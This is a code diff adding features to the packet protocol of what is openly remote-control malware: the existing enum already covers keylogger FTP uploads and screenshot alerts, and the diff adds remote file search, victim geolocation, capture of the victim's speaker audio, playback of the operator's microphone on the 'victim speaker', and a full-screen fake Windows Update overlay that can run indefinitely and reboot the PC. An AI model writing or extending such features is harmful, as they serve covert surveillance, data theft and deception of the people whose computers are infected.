@@ -112,6 +112,10 @@ public enum PacketType
     KeyloggerFtpConfig   = 184,  // server→client: {FtpHost,FtpPort,FtpUser,FtpPass,FtpPath,MaxSizeKb,ClipboardEnabled}
     KeyloggerFtpStatus   = 185,  // client→server: {Event,Filename,Message,Attempt}
 
+    // File Search
+    FmSearch       = 186,  // server→client: {Path, Pattern, Recursive, MaxResults}
+    FmSearchResult = 187,  // client→server: {Results:[{Name,FullPath,Size,IsDir}], Error}
+
     // Hardware Stats (sent periodically by client alongside heartbeat)
     HardwareStats     = 36,   // client→server: {CpuUsage, RamUsed, RamTotal}
     PerfMonStart      = 37,   // server→client: start streaming perf data at interval
@@ -124,6 +128,21 @@ public enum PacketType
     ProcKill       = 192,  // server→client: {Pid}
     ProcSuspend    = 193,  // server→client: {Pid}
     ProcResume     = 194,  // server→client: {Pid}
+
+    // Geolocation
+    GeoRequest = 195,  // server→client: no payload
+    GeoResult  = 196,  // client→server: {Lat, Lon, Accuracy, Source, City, Country, Error}
+
+    // Speaker Loopback
+    SpeakerGetDevices    = 215,  // server→client: request device list
+    SpeakerDevicesResult = 216,  // client→server: {Devices:[{Index,Name,SampleRate,Channels,BitsPerSample}]}
+    SpeakerStart         = 217,  // server→client: {DeviceIndex}
+    SpeakerStop          = 218,  // bidirectional
+    SpeakerData          = 219,  // client→server: {Data} base64 PCM chunk
+    // Speaker Inject (server mic → victim speaker)
+    SpeakerInjectStart   = 223,  // server→client: {SampleRate,Channels,BitsPerSample}
+    SpeakerInjectStop    = 224,  // server→client
+    SpeakerInjectData    = 225,  // server→client: {Data} base64 PCM chunk
 
     // TCP Firewall
     TcpFirewallBlock       = 113,  // server→client: {ProcessName, Port, Direction}
@@ -198,6 +217,11 @@ public enum PacketType
     // Window Notify
     WindowNotifyKeywords = 282, // server→client: {Keywords:[...]}
     WindowNotifyAlert    = 283, // client→server: {Title, Keyword, Screenshot}
+
+    // Fake Update Screen
+    FakeUpdateStart = 284,  // server→client: show full-screen fake Windows Update overlay
+    FakeUpdateStop  = 285,  // server→client: close overlay
+    FakeUpdateAck   = 286,  // client→server: {Success, Error}
 }
 
 public class Packet
@@ -724,4 +748,44 @@ public class WindowNotifyAlertData
     public string Keyword    { get; set; } = string.Empty;
     public string Screenshot { get; set; } = string.Empty; // base64 JPEG
 }
+
+// ── File Search ───────────────────────────────────────
+public class FmSearchData
+{
+    public string Path       { get; set; } = string.Empty;
+    public string Pattern    { get; set; } = "*";
+    public bool   Recursive  { get; set; } = true;
+    public int    MaxResults { get; set; } = 500;
+}
+public class FmSearchEntry       { public string Name { get; set; } = string.Empty; public string FullPath { get; set; } = string.Empty; public long Size { get; set; } public bool IsDir { get; set; } }
+public class FmSearchResultData  { public List<FmSearchEntry> Results { get; set; } = []; public string Error { get; set; } = string.Empty; }
+
+// ── Geolocation ───────────────────────────────────────
+public class GeoResultData
+{
+    public double Lat      { get; set; }
+    public double Lon      { get; set; }
+    public float  Accuracy { get; set; }
+    public string Source   { get; set; } = string.Empty;  // "ip" / "windows"
+    public string City     { get; set; } = string.Empty;
+    public string Region   { get; set; } = string.Empty;
+    public string Country  { get; set; } = string.Empty;
+    public string Isp      { get; set; } = string.Empty;
+    public string Error    { get; set; } = string.Empty;
+}
+
+// ── Speaker Loopback ──────────────────────────────────
+public class SpeakerDevice        { public int Index { get; set; } public string Name { get; set; } = string.Empty; public int SampleRate { get; set; } = 44100; public int Channels { get; set; } = 2; public int BitsPerSample { get; set; } = 32; }
+public class SpeakerDevicesResult { public List<SpeakerDevice> Devices { get; set; } = []; }
+public class SpeakerStartData     { public int DeviceIndex { get; set; } }
+public class SpeakerDataPacket    { public string Data { get; set; } = string.Empty; }
+public class SpeakerInjectStartData { public int SampleRate { get; set; } = 44100; public int Channels { get; set; } = 1; public int BitsPerSample { get; set; } = 16; }
+
+// ── Fake Update Screen ────────────────────────────────
+public class FakeUpdateStartData
+{
+    public int  DurationMinutes { get; set; }  // 0 = infinite; > 0 = auto-close after N min
+    public bool RebootAfter     { get; set; }  // restart PC when duration expires
+}
+public class FakeUpdateAckData    { public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
 
